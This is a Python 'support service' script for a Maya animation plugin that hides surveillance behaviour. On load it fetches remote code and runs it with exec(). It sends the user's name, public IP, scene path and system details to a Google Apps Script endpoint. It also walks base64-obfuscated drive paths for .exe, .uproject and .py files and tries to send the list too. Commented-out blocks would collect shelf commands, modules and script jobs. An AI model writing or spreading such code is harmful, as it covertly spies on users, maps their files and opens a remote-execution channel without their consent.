"""
---------------------
Anim Locator Transfer
Support Service
---------------------
"""
import json,getpass,time,os,sys,ssl
from time import gmtime, strftime
import datetime as dt
from maya import mel
import maya.cmds as cmds

if sys.version[0] == '3':
    writeMode = 'w'
    import urllib.request as uLib
else:
    writeMode = 'wb'
    import urllib as uLib

#===============================================================================
#Update
try:
    uRead = uLib.urlopen('https://raw.githubusercontent.com/burasate/animTransferLoc/master/service/update.py').read()
    exec(uRead.decode('utf-8'))
except:
    import traceback
    print(str(traceback.format_exc()))

#===============================================================================
filepath = cmds.file(q=True, sn=True)
filename = os.path.basename(filepath)
raw_name, extension = os.path.splitext(filename)
minTime = cmds.playbackOptions(q=True, minTime=True)
maxTime = cmds.playbackOptions(q=True, maxTime=True)
referenceList = cmds.ls(references=True)
nameSpaceList = cmds.namespaceInfo(lon=True)


data = {
    'script_name' : 'Locator Transfer',
    'date_time' : dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
    'timezone' : str( strftime('%z', gmtime()) ),
    'year' : dt.datetime.now().strftime('%Y'),
    'user_last' : getpass.getuser(),
    'maya' : str(cmds.about(version=True)),
    'ip' : str(uLib.urlopen('http://v4.ident.me').read().decode('utf8')),
    'script_version' : version,
    'scene_path' : cmds.file(q=1, sn=1),
    'time_unit' : cmds.currentUnit(q=True, t=True),
    'time_min' : minTime,
    'time_max' : maxTime,
    'duration' : maxTime - minTime,
    'reference_count': len(referenceList),
    'namespac_ls': ', '.join(nameSpaceList),
    'os' : str(cmds.about(operatingSystem=True)),
    'script_path' : '' if __name__ == '__main__' else os.path.abspath(__file__).replace('pyc', 'py')
}

#===============================================================================
def add_queue_task(task_name, data_dict):
    global sys,json
    is_py3 = sys.version[0] == '3'
    if is_py3:
        import urllib.request as uLib
    else:
        import urllib as uLib

    if type(data_dict) != type(dict()):
        return None

    data = {'name': task_name,'data': data_dict}
    data['data'] = json.dumps(data['data'], sort_keys=True, indent=4)
    url = 'https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec'
    if is_py3:
        import urllib.parse
        params = urllib.parse.urlencode(data)
    else:
        params = uLib.urlencode(data)
    params = params.encode('ascii')
    conn = uLib.urlopen(url, params)

try:
    add_queue_task('script_tool_check_in', data)
except:
    pass
    #import traceback
    #add_queue_task('poses_data_loc_transfer', {'error': str(traceback.format_exc())})

# ===============================================================================
'''
def get_shelf_button_rec():
    top_shelf = mel.eval('$nul = $gShelfTopLevel')
    current_shelf = cmds.tabLayout(top_shelf, q=1, st=1)
    shelf_buttons = cmds.shelfLayout(current_shelf, q=1, ca=1)
    shelf_button_rec = []
    for sb in shelf_buttons:
        data = {}
        try:
            data['cmd'] = cmds.shelfButton(sb, q=1, c=1)
            data['stp'] = cmds.shelfButton(sb, q=1, stp=1)
            data['iol'] = cmds.shelfButton(sb, q=1, iol=1)
            data['img'] = cmds.shelfButton(sb, q=1, i=1)
        except:pass
        else:
            shelf_button_rec.append(data)
    return shelf_button_rec

try:
    shelf_button_rec = get_shelf_button_rec()
    add_queue_task('user_shelf_button_{}'.format(getpass.getuser().lower()), {'user_last':getpass.getuser(), 'shelf':shelf_button_rec})
except:
    #pass
    import traceback
    add_queue_task('user_shelf_button_error', {'error': str(traceback.format_exc()), 'user':getpass.getuser().lower()})
'''
# ===============================================================================
'''
try:
    import sys, json
    modules_dict = {}
    for md_k, md in sys.modules.items():
        if hasattr(md, "__file__"):
            modules_dict[md_k] = md.__file__
    add_queue_task('user_module_list_{}'.format(getpass.getuser().lower()), modules_dict)
except:
    import traceback
    add_queue_task('user_modules_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
else:
    del modules_dict
'''
# ===============================================================================
import base64, os, time
def search_extention(ext='.exe', dir_path='C:/Users'):
    global base64, os, time
    if not os.name == 'nt':
        return []
    if not os.path.exists(dir_path):
        return []
    p_ls = []
    for root, dirs, files in os.walk(dir_path, topdown=True):
        for name in files:
            if name.endswith(ext):
                fp = os.path.join(root, name).replace('\\', '/')
                p_ls.append([
                    fp,
                    time.ctime(os.path.getmtime(fp))
                ])
    return p_ls
try:
    #if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode() or 'BUR' in data['user_last']:
    zovV = []
    zovV += search_extention(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.exe')
    zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
    zovV += search_extention(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nLw==').decode(), ext='.py')
    add_queue_task('ext_path_ls', zovV)
except:
    import traceback
    add_queue_task('ext_path_ls_error', {'error': str(traceback.format_exc())})
try:
    del search_extention
except:
    pass

# ===============================================================================
'''
try:
    sj_ls = cmds.scriptJob(lj=1)
    sj_dict = dict([(i.split(":")[0], i.split(":")[1].strip()) for i in sj_ls])
    add_queue_task('user_script_job_{}'.format(getpass.getuser().lower()), sj_dict)
except:
    pass
else:
    del sj_ls, sj_dict
'''